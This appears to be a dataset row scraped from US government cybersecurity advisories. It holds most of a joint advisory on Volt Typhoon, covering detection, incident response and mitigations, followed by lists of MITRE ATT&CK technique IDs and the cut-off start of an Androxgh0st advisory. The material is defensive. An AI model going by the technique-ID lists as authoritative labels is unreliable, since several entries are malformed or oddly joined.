Set up security incident and event monitoring (SIEM) to monitor, analyze, and correlate event logs from across the ICS network to identify intrusion attempts.

Review CISA’s Recommended Cybersecurity Practices for Industrial Control Systems and the joint advisory, NSA and CISA Recommend Immediate Actions to Reduce Exposure Across all Operational Technologies and Control Systems, for further OT system detection and mitigation guidance.
Use gait to Detect Possible Network Proxy Activities
Use gait,4, to detect network proxy activities. Developed by Sandia National Labs, gait is a publicly available Zeek,5, extension. The gait extension can help enrich Zeek’s network connection monitoring and SSL logs by including additional metadata in the logs. Specifically, gait captures unique TCP options and timing data such as a TCP, transport layer security (TLS), and Secure Shell (SSH) layer inferred round trip times (RTT), aiding in the identification of the software used by both endpoints and intermediaries.
While the gait extension for Zeek is an effective tool for enriching network monitoring logs with detailed metadata, it is not specifically designed to detect Volt Typhoon actor activities. The extension’s capabilities extend to general anomaly detection in network traffic, including—but not limited to—proxying activities. Therefore, while gait can be helpful in identifying tactics similar to those used by Volt Typhoon, such as proxy networks and FRP clients for C2 communication, not all proxying activities detected by using this additional metadata are necessarily indicative of Volt Typhoon presence. It serves as a valuable augmentation to current security stacks for a broader spectrum of threat detection.
For more information, see Sandia National Lab’s gait GitHub page sandialabs/gait: Zeek Extension to Collect Metadata for Profiling of Endpoints and Proxies.
Review Logins for Impossible Travel
Examine VPN or other account logon times, frequency, duration, and locations. Logons from two geographically distant locations within a short timeframe from a single user may indicate an account is being used maliciously. Logons of unusual frequency or duration may indicate a threat actor attempting to access a system repeatedly or maintain prolonged sessions for the purpose of data extraction.
Review Standard Directories for Unusual Files
Review directories, such as C:\windows\temp\ and C:\users\public\, for unexpected or unusual files. Monitor these temporary file storage directories for files typically located in standard system paths, such as the System32 directory. For example, Volt Typhoon has been observed downloading comsvcs.dll to a non-standard folder (this file is normally found in the System32 folder).
INCIDENT RESPONSE
If compromise, or potential compromise, is detected, organizations should assume full domain compromise because of Volt Typhoon’s known behavioral pattern of extracting the NTDS.dit from the DCs. Organizations should immediately implement the following immediate, defensive countermeasures:

Sever the enterprise network from the internet. Note: this step requires the agency to understand its internal and external connections. When making the decision to sever internet access, knowledge of connections must be combined with care to avoid disrupting critical functions.

If you cannot sever from the internet, shutdown all non-essential traffic between the affected enterprise network and the internet.


Reset credentials of privileged and non-privileged accounts within the trust boundary of each compromised account.

Reset passwords for all domain users and all local accounts, such as Guest, HelpAssistant, DefaultAccount, System, Administrator, and krbtgt. The krbtgt account is responsible for handling Kerberos ticket requests as well as encrypting and signing them. The krbtgt account should be reset twice because the account has a two-password history. The first account reset for the krbtgt needs to be allowed to replicate prior to the second reset to avoid any issues. See CISA’s Eviction Guidance for Networks Affected by the SolarWinds and Active Directory/M365 Compromise for more information. Although tailored to FCEB agencies compromised in the 2020 SolarWinds Orion supply chain compromise, the steps are applicable to organizations with Windows AD compromise.

Review access policies to temporarily revoke privileges/access for affected accounts/devices. If it is necessary to not alert the attacker (e.g., for intelligence purposes), then privileges can be reduced for affected accounts/devices to “contain” them.


Reset the relevant account credentials or access keys if the investigation finds the threat actor’s access is limited to non-elevated permissions.

Monitor related accounts, especially administrative accounts, for any further signs of unauthorized access.




Audit all network appliance and edge device configurations with indicators of malicious activity for signs of unauthorized or malicious configuration changes. Organizations should ensure they audit the current network device running configuration and any local configurations that could be loaded at boot time. If configuration changes are identified:

Change all credentials being used to manage network devices, to include keys and strings used to secure network device functions (SNMP strings/user credentials, IPsec/IKE preshared keys, routing secrets, TACACS/RADIUS secrets, RSA keys/certificates, etc.).
Update all firmware and software to the latest version.


Report the compromise to an authoring agency (see the Contact Information section).
For organizations with cloud or hybrid environments, apply best practices for identity and credential access management. 

Verify that all accounts with privileged role assignments are cloud native, not synced from Active Directory.
Audit conditional access policies to ensure Global Administrators and other highly privileged service principals and accounts are not exempted.
Audit privileged role assignments to ensure adherence to the principle of least privilege when assigning privileged roles.
Leverage just-in-time and just-enough access mechanisms when administrators need to elevate to a privileged role.
In hybrid environments, ensure federated systems (such as AD FS) are configured and monitored properly.
Audit Enterprise Applications for recently added applications and examine the API permissions assigned to each.


Reconnect to the internet. Note: The decision to reconnect to the internet depends on senior leadership’s confidence in the actions taken. It is possible—depending on the environment—that new information discovered during pre-eviction and eviction steps could add additional eviction tasks.
Minimize and control use of remote access tools and protocols by applying best practices from joint Guide to Securing Remote Access Software and joint Cybersecurity Information Sheet: Keeping PowerShell: Security Measures to Use and Embrace.
Consider sharing technical information with an authoring agency and/or a sector-specific information sharing and analysis center.

For more information on incident response and remediation, see:

Joint advisory Technical Approaches to Uncovering and Remediating Malicious Activity. This advisory provides incident response best practices.
CISA’s Federal Government Cybersecurity Incident and Vulnerability Response Playbooks. Although tailored to U.S. Federal Civilian Executive Branch (FCEB) agencies, the playbooks are applicable to all organizations. The incident response playbook provides procedures to identify, coordinate, remediate, recover, and track successful mitigations from incidents.
Joint Water and Wastewater Sector - Incident Response Guide. This joint guide provides incident response best practices and information on federal resources for Water and Wastewater Systems Sector organizations.

MITIGATIONS
These mitigations are intended for IT administrators in critical infrastructure organizations. The authoring agencies recommend that software manufactures incorporate secure by design and default principles and tactics into their software development practices to strengthen the security posture for their customers.
For information on secure by design practices that may protect customers against common Volt Typhoon techniques, see joint guide Identifying and Mitigating Living off the Land Techniques and joint Secure by Design Alert Security Design Improvements for SOHO Device Manufacturers.
For more information on secure by design, see CISA’s Secure by Design webpage and joint guide.
The authoring agencies recommend organizations implement the mitigations below to improve your organization’s cybersecurity posture on the basis of Volt Typhoon activity. These mitigations align with the Cross-Sector Cybersecurity Performance Goals (CPGs) developed by CISA and the National Institute of Standards and Technology (NIST). The CPGs provide a minimum set of practices and protections that CISA and NIST recommend all organizations implement. CISA and NIST based the CPGs on existing cybersecurity frameworks and guidance to protect against the most common and impactful threats, tactics, techniques, and procedures. Visit CISA’s Cross-Sector Cybersecurity Performance Goals for more information on the CPGs, including additional recommended baseline protections.
IT Network Administrators and Defenders
Harden the Attack Surface

Apply patches for internet-facing systems within a risk-informed span of time,CPG 1E,. Prioritize patching critical assets, known exploited vulnerabilities, and vulnerabilities in appliances known to be frequently exploited by Volt Typhoon (e.g., Fortinet, Ivanti, NETGEAR, Citrix, and Cisco devices).
Apply vendor-provided or industry standard hardening guidance to strengthen software and system configurations. Note: As part of CISA’s Secure by Design campaign, CISA urges software manufacturers to prioritize secure by default configurations to eliminate the need for customer implementation of hardening guidelines.
Maintain and regularly update an inventory of all organizational IT assets,CPG 1A,.
Use third party assessments to validate current system and network security compliance via security architecture reviews, penetration tests, bug bounties, attack surface management services, incident simulations, or table-top exercises (both announced and unannounced),CPG 1F,.
Limit internet exposure of systems when not necessary. An organization’s primary attack surface is the combination of the exposure of all its internet-facing systems. Decrease the attack surface by not exposing systems or management interfaces to the internet when not necessary.
Plan “end of life” for technology beyond manufacturer supported lifecycle. Inventories of organizational assets should be leveraged in patch and configuration management as noted above. Inventories will also enable identification of technology beyond the manufacturer’s supported lifecycle. Where technology is beyond “end of life” or “end of support,” additional cybersecurity vigilance is necessary, and may warrant one or more of the following:

Supplemental support agreements;
Additional scanning and testing;
Configuration changes;
Isolation;
Segmentation; and
Development of forward-looking plans to facilitate replacement.



Secure Credentials

Do not store credentials on edge appliances/devices. Ensure edge devices do not contain accounts that could provide domain admin access.
Do not store plaintext credentials on any system,CPG 2L,. Credentials should be stored securely—such as with a credential/password manager or vault, or other privileged account management solutions—so they can only be accessed by authenticated and authorized users.
Change default passwords,CPG 2A, and ensure they meet the policy requirements for complexity.
Implement and enforce an organizational system-enforced policy that:

Requires passwords for all IT password-protected assets to be at least 15 characters;
Does not allow users to reuse passwords for accounts, applications, services, etc.,CPG 2C,; and
Does not allow service accounts/machine accounts to reuse passwords from member user accounts.


Configure Group Policy settings to prevent web browsers from saving passwords and disable autofill functions.
Disable the storage of clear text passwords in LSASS memory.

Secure Accounts

Implement phishing-resistant MFA for access to assets,CPG 2H,.
Separate user and privileged accounts.

User accounts should never have administrator or super-user privileges,CPG 2E,.
Administrators should never use administrator accounts for actions and activities not associated with the administrator role (e.g., checking email, web browsing).


Enforce the principle of least privilege.

Ensure administrator accounts only have the minimum permissions necessary to complete their tasks.
Review account permissions for default/accounts for edge appliances/devices and remove domain administrator privileges, if identified.
Significantly limit the number of users with elevated privileges. Implement continuous monitoring for changes in group membership, especially in privileged groups, to detect and respond to unauthorized modifications.
Remove accounts from high-privilege groups like Enterprise Admins and Schema Admins. Temporarily reinstate these privileges only when necessary and under strict auditing to reduce the risk of privilege abuse.
Transition to Group Managed Service Accounts (gMSAs) where suitable for enhanced management and security of service account credentials. gMSAs provide automated password management and simplified Service Principal Name (SPN) management, enhancing security over traditional service accounts. See Microsoft’s Group Managed Service Accounts Overview.


Enforce strict policies via Group Policy and User Rights Assignments to limit high-privilege service accounts.
Consider using a privileged access management (PAM) solution to manage access to privileged accounts and resources,CPG 2L,. PAM solutions can also log and alert usage to detect any unusual activity.
Complement the PAM solution with role-based access control (RBAC) for tailored access based on job requirements. This ensures that elevated access is granted only when required and for a limited duration, minimizing the window of opportunity for abuse or exploitation of privileged credentials.
Implement an Active Directory tiering model to segregate administrative accounts based on their access level and associated risk. This approach reduces the potential impact of a compromised account. See Microsoft’s PAM environment tier model.
Harden administrative workstations to only permit administrative activities from workstations appropriately hardened based on the administrative tier. See Microsoft’s Why are privileged access devices important - Privileged access.
Disable all user accounts and access to organizational resources of employees on the day of their departure,CPG 2G,
Regularly audit all user, admin, and service accounts and remove or disable unused or unneeded accounts as applicable.
Regularly roll NTLM hashes of accounts that support token-based authentication.
Improve management of hybrid (cloud and on-premises) identity federation by:

Using cloud only administrators that are asynchronous with on-premises environments and ensuring on-premises administrators are asynchronous to the cloud.
Using CISA’s SCuBAGear tool to discover cloud misconfigurations in Microsoft cloud tenants. SCuBA gear is automation script for comparing Federal Civilian Executive Branch (FCEB) agency tenant configurations against CISA M365 baseline recommendations. SCuBAGear is part of CISA’s Secure Cloud Business Applications (SCuBA) project, which provides guidance for FCEB agencies, securing their cloud business application environments and protecting federal information created, accessed, shared, and stored in those environments. Although tailored to FCEB agencies, the project provides security guidance applicable to all organizations with cloud environments. For more information on SCuBAGear see CISA’s Secure Cloud Business Applications (SCuBA) Project.
Using endpoint detection and response capabilities to actively defend on-premises federation servers.



Secure Remote Access Services

Limit the use of RDP and other remote desktop services. If RDP is necessary, apply best practices, including auditing the network for systems using RDP, closing unused RDP ports, and logging RDP login attempts.
Disable Server Message Block (SMB) protocol version 1 and upgrade to version 3 (SMBv3) after mitigating existing dependencies (on existing systems or applications), as they may break when disabled.
Harden SMBv3 by implementing guidance included in joint #StopRansomware Guide (see page 8 of the guide).
Apply mitigations from the joint Guide to Securing Remote Access Software.

Secure Sensitive Data

Securely store sensitive data (including operational technology documentation, network diagrams, etc.), ensuring that only authenticated and authorized users can access the data.

Implement Network Segmentation

Ensure that sensitive accounts use their administrator credentials only on hardened, secure computers. This practice can reduce lateral movement exposure within networks.
Conduct comprehensive trust assessments to identify business-critical trusts and apply necessary controls to prevent unauthorized cross-forest/domain traversal.
Harden federated authentication by enabling Secure Identifier (SID) Filtering and Selective Authentication on AD trust relationships to further restrict unauthorized access across domain boundaries.
Implement network segmentation to isolate federation servers from other systems and limit allowed traffic to systems and protocols that require access in accordance with Zero Trust principles.

Secure Cloud Assets

Harden cloud assets in accordance with vendor-provided or industry standard hardening guidance.

Organizations with Microsoft cloud infrastructure, see CISA’s Microsoft 365 Security Configuration Baseline Guides, which provide minimum viable secure configuration baselines for Microsoft Defender for Office 365, Azure Active Directory (now known as Microsoft Entra ID), Exchange Online, OneDrive for Business, Power BI, Power Platform, SharePoint Online, and Teams. For additional guidance, see the Australian Signals Directorate’s Blueprint for Secure Cloud.
Organizations with Google cloud infrastructure, see CISA’s Google Workspace Security Configuration Baseline Guides, which provide minimum viable secure configuration baselines for Groups for Business, GMAIL, Google Calendar, Google Chat, Google Common Controls, Google Classroom, Google Drive and Docs, Google Meet, and Google Sites.


Revoke unnecessary public access to cloud environment. This involves reviewing and restricting public endpoints and ensuring that services like storage accounts, databases, and virtual machines are not publicly accessible unless absolutely necessary. Disable legacy authentication protocols across all cloud services and platforms. Legacy protocols frequently lack support for advanced security mechanisms such as multifactor authentication, rendering them susceptible to compromises. Instead, enforce the use of modern authentication protocols that support stronger security features like MFA, token-based authentication, and adaptive authentication measures.

Enforce this practice through the use of Conditional Access Policies. These policies can initially be run in report-only mode to identify potential impacts and plan mitigations before fully enforcing them. This approach allows organizations to systematically control access to their cloud resources, significantly reducing the risk of unauthorized access and potential compromise.


Regularly monitor and audit privileged cloud-based accounts, including service accounts, which are frequently abused to enable broad cloud resource access and persistence.

Be Prepared

Ensure logging is turned on for application, access, and security logs (e.g., intrusion detection systems/intrusion prevention systems, firewall, data loss prevention, and VPNs),CPG 2T,. Given Volt Typhoon’s use of LOTL techniques and their significant dwell time, application event logs may be a valuable resource to hunt for Volt Typhoon activity because these logs typically remain on endpoints for relatively long periods of time.

For OT assets where logs are non-standard or not available, collect network traffic and communications between those assets and other assets.
Implement file integrity monitoring (FIM) tools to detect unauthorized changes.


Store logs in a central system, such as a security information and event management (SIEM) tool or central database.

Ensure the logs can only be accessed or modified by authorized and authenticated users,CPG 2U,.
Store logs for a period informed by risk or pertinent regulatory guidelines.
Tune log alerting to reduce noise while ensuring there are alerts for high-risk activities. (For information on alert tuning, see joint guide Identifying and Mitigating Living Off the Land Techniques.)


Establish and continuously maintain a baseline of installed tools and software, account behavior, and network traffic. This way, network defenders can identify potential outliers, which may indicate malicious activity. Note: For information on establishing a baseline, see joint guide Identifying and Mitigating Living off the Land Techniques.
Document a list of threats and cyber actor TTPs relevant to your organization (e.g., based on industry or sectors), and maintain the ability (such as via rules, alerting, or commercial prevention and detection systems) to detect instances of those key threats,CPG 3A,.
Implement periodic training for all employees and contractors that covers basic security concepts (such as phishing, business email compromise, basic operational security, password security, etc.), as well as fostering an internal culture of security and cyber awareness,CPG 2I,.

Tailor the training to network IT personnel/administrators and other key staff based on relevant organizational cyber threats and TTPs, such as Volt Typhoon. For example, communicate that Volt Typhoon actors are known to target personal email accounts of IT staff, and encourage staff to protect their personal email accounts by using strong passwords and implementing MFA.
In addition to basic cybersecurity training, ensure personnel who maintain or secure OT as part of their regular duties receive OT-specific cybersecurity training on at least an annual basis,CPG 2J,.
Educate users about the risks associated with storing unprotected passwords.



OT Administrators and Defenders

Change default passwords,CPG 2A, and ensure they meet the policy requirements for complexity. If the asset’s password cannot be changed, implement compensating controls for the device; for example, segment the device into separate enclaves and implement increased monitoring and logging.
Require that passwords for all OT password-protected assets be at least 15 characters, when technically feasible. In instances where minimum passwords lengths are not technically feasible (for example, assets in remote locations), apply compensating controls, record the controls, and log all login attempts.,CPG 2B,.
Enforce strict access policies for accessing OT networks. Develop strict operating procedures for OT operators that details secure configuration and usage.
Segment OT assets from IT environments by,CPG 2F,:

Denying all connections to the OT network by default unless explicitly allowed (e.g., by IP address and port) for specific system functionality.
Requiring necessary communications paths between IT and OT networks to pass through an intermediary, such as a properly configured firewall, bastion host, “jump box,” or a demilitarized zone (DMZ), which is closely monitored, captures network logs, and only allows connections from approved assets.


Closely monitor all connections into OT networks for misuse, anomalous activity, or OT protocols.
Monitor for unauthorized controller change attempts. Implement integrity checks of controller process logic against a known good baseline. Ensure process controllers are prevented from remaining in remote program mode while in operation if possible.
Lock or limit set points in control processes to reduce the consequences of unauthorized controller access.
Be prepared by:

Determining your critical operational processes’ reliance on key IT infrastructure:

Maintain and regularly update an inventory of all organizational OT assets.
Understand and evaluate cyber risk on “as-operated” OT assets.
Create an accurate “as-operated” OT network map and identify OT and IT network inter-dependencies.


Identifying a resilience plan that addresses how to operate if you lose access to or control of the IT and/or OT environment.

Plan for how to continue operations if a control system is malfunctioning, inoperative, or actively acting contrary to the safe and reliable operation of the process.
Develop workarounds or manual controls to ensure ICS networks can be isolated if the connection to a compromised IT environment creates risk to the safe and reliable operation of OT processes.


Create and regularly exercise an incident response plan.

Regularly test manual controls so that critical functions can be kept running if OT networks need to be taken offline.


Implement regular data backup procedures on OT networks.

Regularly test backup procedures.




Follow risk-informed guidance in the joint advisory NSA and CISA Recommend Immediate Actions to Reduce Exposure Across all Operational Technologies and Control Systems, the NSA advisory Stop Malicious Cyber Activity Against Connected Operational Technology.

CONTACT INFORMATION
US organizations: To report suspicious or criminal activity related to information found in this joint Cybersecurity Advisory, contact:

CISA’s 24/7 Operations Center at Report@cisa.gov or 1-844-Say-CISA (1-844-729-2472) or your local FBI field office. When available, please include the following information regarding the incident: date, time, and location of the incident; type of activity; number of people affected; type of equipment used for the activity; the name of the submitting company or organization; and a designated point of contact.
For NSA client requirements or general cybersecurity inquiries, contact Cybersecurity_Requests@nsa.gov.
Water and Wastewater Systems Sector organizations, contact the EPA Water Infrastructure and Cyber Resilience Division at watercyberta@epa.gov to voluntarily provide situational awareness.
Entities required to report incidents to DOE should follow established reporting requirements, as appropriate. For other energy sector inquiries, contact EnergySRMA@hq.doe.gov.
For transportation entities regulated by TSA, report to CISA Central in accordance with the requirements found in applicable Security Directives, Security Programs, or TSA Order.

Australian organizations: Visit cyber.gov.au or call 1300 292 371 (1300 CYBER 1) to report cybersecurity incidents and access alerts and advisories.
Canadian organizations: Report incidents by emailing CCCS at contact@cyber.gc.ca.
New Zealand organizations: Report cyber security incidents to incidents@ncsc.govt.nz or call 04 498 7654.
United Kingdom organizations: Report a significant cyber security incident: ncsc.gov.uk/report-an-incident (monitored 24 hours) or, for urgent assistance, call 03000 200 973.
VALIDATE SECURITY CONTROLS
In addition to applying mitigations, the authoring agencies recommend exercising, testing, and validating your organization's security program against the threat behaviors mapped to the MITRE ATT&CK for Enterprise framework in this advisory. The authoring agencies recommend testing your existing security controls inventory to assess how they perform against the ATT&CK techniques described in this advisory.
To get started:

Select an ATT&CK technique described in this advisory (see Table 5 through Table 17).
Align your security technologies against the technique.
Test your technologies against the technique.
Analyze your detection and prevention technologies’ performance.
Repeat the process for all security technologies to obtain a set of comprehensive performance data.
Tune your security program, including people, processes, and technologies, based on the data generated by this process.

The authoring agencies recommend continually testing your security program, at scale, in a production environment to ensure optimal performance against the MITRE ATT&CK techniques identified in this advisory.
REFERENCES,1, fofa,2, Microsoft: Volt Typhoon targets US critical infrastructure with living-off-the-land techniques,3, GitHub - fatedier/frp: A fast reverse proxy to help you expose a local server behind a NAT or firewall to the internet,4, GitHub - sandialabs/gait: Zeek Extension to Collect Metadata for Profiling of Endpoints and Proxies,5, The Zeek Network Security Monitor
RESOURCES
Microsoft: Volt Typhoon targets US critical infrastructure with living-off-the-land techniquesSecureworks: Chinese Cyberespionage Group BRONZE SILHOUETTE Targets U.S. Government and Defense Organizations
DISCLAIMER
The information in this report is being provided “as is” for informational purposes only. The authoring agencies do not endorse any commercial entity, product, company, or service, including any entities, products, or services linked within this document. Any reference to specific commercial entities, products, processes, or services by service mark, trademark, manufacturer, or otherwise, does not constitute or imply endorsement, recommendation, or favoring by the authoring agencies.
ACKNOWLEDGEMENTS
Fortinet and Microsoft contributed to this advisory.
VERSION HISTORY
February 7, 2024: Initial Version.March 7, 2024: Updated Mitigations section to add recommendation on “end of life” technology.
APPENDIX A: VOLT TYPHOON OBSERVED COMMANDS / LOTL ACTIVITY
See Table 2 and Table 3 for Volt Typhoon commands and PowerShell scripts observed by the U.S. authoring agencies during incident response activities. For additional commands used by Volt Typhoon, see joint advisory People's Republic of China State-Sponsored Cyber Actor Living off the Land to Evade Detection.


APPENDIX B: INDICATORS OF COMPROMISE
See Table 4 for Volt Typhoon IOCs obtained by the U.S. authoring agencies during incident response activities.
Note: See MAR-10448362-1.v1 for more information on this malware.

APPENDIX C: MITRE ATT&CK TACTICS AND TECHNIQUES
See Table 5 through Table 17 for all referenced threat actor tactics and techniques in this advisory.



















This product is provided subject to this Notification and this Privacy & Use policy.


","['T1070', 'T1095', 'T1057', 'T1018', 'T1119', 'T1090', 'T1578', 'T1553', 'T1583', 'T1568', 'T1482', 'T1552', 'T1112', 'T1498', 'T1204', 'T1612', 'T1531', 'T1548', 'T1007', 'T1586', 'T1587', 'T1480', 'T1218', 'T1490', 'T1059', 'T1588', 'T1597', 'T1550', 'T1558', 'T1219', 'T1087', 'T1036', 'T1199', 'T1027', 'T1129', 'T1613', 'T1535', 'T1584', 'T1565', 'T1580', 'T1571', 'T1069', 'T1615', 'T1083', 'T1049', 'T1056', 'T1195', 'T1020', 'T1528', 'T1564', 'T1078', 'T1560', 'T1555', 'T1176', 'T1021', 'T1213', 'T1003']","{'T1003.001', 'T1070', 'T1588.002', 'T1095', 'T1003.003', 'T1216.002', 'T1016', 'T1558.004', 'T1059.003', 'T1110.001', 'T1588.005', 'T1189', 'T1027', 'T1550.002', 'T1558.001', 'T1098.006', 'T1584', 'T1580', 'T1217', 'T1078.004', 'T1090.003', 'T1049', 'T1530', 'T1201', 'T1003', 'T1526', 'T1090.002', 'T1611', 'T1021.001', 'T1018', 'T1553.003', 'T1070.009', 'T1556.009', 'T1556.007', 'T1482', 'T1589.001', 'T1555.003', 'T1006', 'T1490', 'T1599', 'T1562.001', 'T1084', 'T1087', 'T1016.001', 'T1098', 'T1552.001', 'T1133', 'T1594', 'T1083', 'T1548.005', 'T1195.002', 'T1591', 'T1056.004', 'T1590.004', 'T1010', 'T1557.001', 'T1098.001', 'T1005', 'T1587.001', 'T1595', 'T1111', 'T1591.004', 'T1596.005', 'T1090', 'T1484.001', 'T1087.004', 'T1068', 'T1070.007', 'T1602.002', 'T1040', 'T1590.006', 'T1592.001', 'T1110.004', 'T1489', 'T1560.001', 'T1070.004', 'T1071', 'T1562.007', 'T1190', 'T1110.003', 'T1505.003', 'T1021', 'T1591.001', 'T1555.004', 'T1078.003', 'T1547.001', 'T1552.002', 'T1539', 'T1569.002', 'T1518.001', 'T1033', 'T1078.002', 'T1057', 'T1046', 'T1584.004', 'T1087.001', 'T1069.001', 'T1036.005', 'T1548.003', 'T1074.001', 'T1082', 'T1090.001', 'T1105', 'T1003.006', 'T1219', 'T1589.002', 'T1076', 'T1059.001', 'T1199', 'T1574.002', 'T1562.002', 'T1041', 'T1070.001', 'T1584.005', 'T1484.002', 'T1597.001', 'T1056.003', 'T1556.006', 'T1518', 'T1078', 'T1074.002', 'T1562.010', 'T1562.011', 'T1555'}","{'T1070', 'T1003.001', 'T1588.002', 'T1095', 'T1003.003', 'T1216.002', 'T1558.003, T1003, T1040, T1021.004', 'T1609.001', 'T1016', 'T1558.004', 'T1059.003', 'T1110.001', 'T1588.005', 'T1189, T1553.001, T1557.003', 'T1036', 'T1027', 'T1550.002', 'T1558.001', 'T1098.006', 'T1584', 'T1580', 'T1217', 'T1480.001', 'T1078.004', 'T1090.003', 'T1082, T1046, T1069.002, T1087.001', 'T1049', 'T1530', 'T1021.001, T1078', 'T1647', 'T1201', 'T1109', 'T1003', 'T1526', 'T1090.002', 'T1611', 'T1078, T1133, T1021.001', 'T1021.001', 'T1018', 'T1587.004', 'T1070.009', 'T1069.002', 'T1078, T1005, T1041', 'T1005, T1041', 'T1556.009', 'T1556.007', 'T1482', 'T1589.001', 'T1555.003', 'T1021.001, T1078.003', 'T1222.001', 'T1078, T1105', 'T1056.001', 'T1006', 'T1059', 'T1599', 'T1597', 'T1562.001', 'T1084', 'T1087', 'T1484', 'T1556.008', 'T1016.001', 'T1098', 'T1010, T1056.001', 'T1552.001', 'T1133', 'T1594', 'T1083', 'T1600', 'T1195.002', 'T1548.005', 'T1591', 'T1082, T1016, T1033', 'T1195.003', 'T1555.', 'T1590.004', 'T1016, T1007', 'T1553.006', 'T1070.001, T1036.005', 'T1098.001', 'T1005', 'T1529', 'T1587.001', 'T1595', 'T1111', 'T1591.004', 'T1087.001, T1033', 'T1596.005', 'T1090', 'T1078, T1021.001', 'T1556.002', 'T1484.001', 'T1078, T1003.006', 'T1087.004', 'T1076, T1021.001', 'T1068', 'T1586', 'T1070.007', 'T1602.002', 'T1040', 'T1602', 'T1590.006', 'T1592.001', 'T1110.004', 'T1489', 'T1560.001', 'T1070.004', 'T1016, T1033, T1518.001, T1083, T1082, T1063, T1012, T1057, T1007, T1614, T1518', 'T1021.002', 'T1071', 'T0838', 'T1562.007', 'T1556.001', 'T1190', 'T1110.003', 'T1505.003', 'T1562', 'T1021', 'T1591.001', 'T1555.004', 'T1078.003', 'T1552.002', 'T1539', 'T1569.002', 'T1518.001', 'T1078.002', 'T1057', 'T1046', 'T1584.004', 'T1087.001', 'T1595.002', 'T1036.005', 'T1588.005, T1203', 'T1548.003', 'T1074.001', 'T1206', 'T1082', 'T1090.001', 'T1522', 'T1480', 'T1105', 'T1219', 'T1589.002', 'T1199', 'T1059.001', 'T1574.002', 'T1562.002', 'T1041', 'T1070.001', 'T1584.005', 'T1496', 'T1484.002', 'T1597.001', 'T1556.006', 'T1518', 'T1078', 'T1584.008', 'T1074.002', 'T1555.006', 'T1562.010', 'T1562.011', 'T1555'}","{'T1070', 'T1589', 'T1592', 'T0857', 'T1563, T1569', 'T0862', 'T1003, T1070', 'T1057, T1106', 'T0869', 'T1218', 'T1547', 'T1583, T1090', 'T1021, T1071, T1003', 'T1208', 'T1027', 'T1078, T1572', 'T1572', 'T1566', 'T1648', 'T1567', 'T1025, T1567', 'T1217', 'T1078, T1110', 'T1078, T1550', 'T1078, T1562, T1588', 'T1070, T1005', 'T1078, T1021, T1003, T1059, T1070, T1560, T1041', 'T1201', 'T0889', 'T1114', 'T1003', 'T1087, T1082, T1016', 'T1217, T1555, T1592', 'T1078, T1003', 'T1078, T1566, T1071', 'T1018', 'T1078, T1210, T1566', 'T0868', 'T1563', 'T0831', 'T1558, T1003, T1040, T1021', 'T1078, T1068', 'T1553', 'T1078, T1087, T1200', 'T0859', 'T1078, T1550, T1021', 'T1078, T1087, T1016, T1057, T1071, T1105, T1027, T1562, T1574', 'T1609', 'T1484', 'T1087', 'T1078, T1210', 'T0864', 'T0837', 'T1078, T1021, T1071', 'T1059, T1047', 'T1083', 'T1600', 'T1087, T1078, T1556', 'T1596', 'T1078, T1083, T1110', 'T1003, T1083, T1025, T1041', 'T1078, T1570', 'T1005', 'T1583, T1584, T1585, T1586, T1587, T1588, T1589', 'T1595', 'T1212, T1087', 'T0803', 'T1090', 'T1056, T1059', 'T1557', 'T1070, T1036', 'T1078, T1547', 'T1552', 'T1595, T1596, T1597', 'T1087, T1078, T1105', 'T1074', 'T0887', 'T1040', 'T1558', 'T1602', 'T1203', 'T1003, T1087', 'T0860', 'T1078, T1210, T1552', 'T1110', 'T1203, T1078, T1027', 'T1016, T1057', 'T1070.004', 'T1076, T1003', 'T1615', 'T1071', 'T1556', 'T0838', 'T1190', 'T1078, T1021', 'T1595, T1580, T1078, T1053', 'T1560', 'T1499, T1498', 'T1003, T1078, T1082, T1105, T1218', 'T1078, T1071, T1105', 'T1078, T1027', 'T1562', 'T1021', 'T1595, T1587, T1566', 'T1078, T1218', 'T1082, T1046, T1069, T1033', 'T1587, T1588', 'T1082', 'T1195, T1078', 'T1219, T1059', 'T1569', 'T1531', 'T1219', 'T1076', 'T1595, T1598, T1602', 'T1564, T1574', 'T0881', 'T1583, T1584, T1585, T1586, T1587, T1588, T1590, T1591, T1592, T1595', 'T1082, T1218', 'T1071, T1020', 'T1190, T1133', 'T1078', 'T1210, T1562', 'T1021, T1016', 'T1555'}"
4,https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-016a,"






Actions to take today to mitigate malicious cyber activity:




Prioritize patching known exploited vulnerabilities in internet-facing systems.
Review and ensure only necessary servers and services are exposed to the internet.
Review platforms or services that have credentials listed in .env files for unauthorized access or use.







SUMMARY
The Federal Bureau of Investigation (FBI) and the Cybersecurity and Infrastructure Security Agency (CISA) are releasing this joint Cybersecurity Advisory (CSA) to disseminate known indicators of compromise (IOCs) and tactics, techniques, and procedures (TTPs) associated with threat actors deploying Androxgh0st malware. Multiple, ongoing investigations and trusted third party reporting yielded the IOCs and TTPs, and provided information on Androxgh0st malware’s ability to establish a botnet that can further identify and compromise vulnerable networks.
The FBI and CISA encourage organizations to implement the recommendations in the Mitigations section of this CSA to reduce the likelihood and impact of cybersecurity incidents caused by Androxgh0st infections.
Download the PDF version of this report:


AA24-016A Known Indicators of Compromise Associated with Androxgh0st Malware
(PDF,       576.40 KB
  )




AA24-016A Known Indicators of Compromise Associated with Androxgh0st Malware - Spanish
(PDF,       353.45 KB
  )


For a downloadable copy of IOCs, see:


AA24-016A STIX XML
(XML,       45.81 KB
  )




AA24-016A STIX JSON
(JSON,       39.87 KB
  )


TECHNICAL DETAILS
Note: This advisory uses the MITRE ATT&CK® for Enterprise framework, version 14. See the MITRE ATT&CK Tactics and Techniques section for a table of the threat actors’ activity mapped to MITRE ATT&CK tactics and techniques with corresponding mitigation and/or detection recommendations. For assistance with mapping malicious cyber activity to the MITRE ATT&CK framework, see CISA and MITRE ATT&CK’s Best Practices for MITRE ATT&CK Mapping and CISA’s Decider Tool.
Overview
Androxgh0st malware has been observed establishing a botnet [T1583.005] for victim identification and exploitation in target networks. According to open source reporting[1], Androxgh0st is a Python-scripted malware [T1059.006] primarily used to target .env files that contain confidential information, such as credentials [T1552.001] for various high profile applications (i.e., Amazon Web Services [AWS], Microsoft Office 365, SendGrid, and Twilio from the Laravel web application framework). Androxgh0st malware also supports numerous functions capable of abusing the Simple Mail Transfer Protocol (SMTP), such as scanning [T1046] and exploiting exposed credentials [T1078] and application programming interfaces (APIs) [T1114], and web shell deployment [T1505.003].
Targeting the PHPUnit
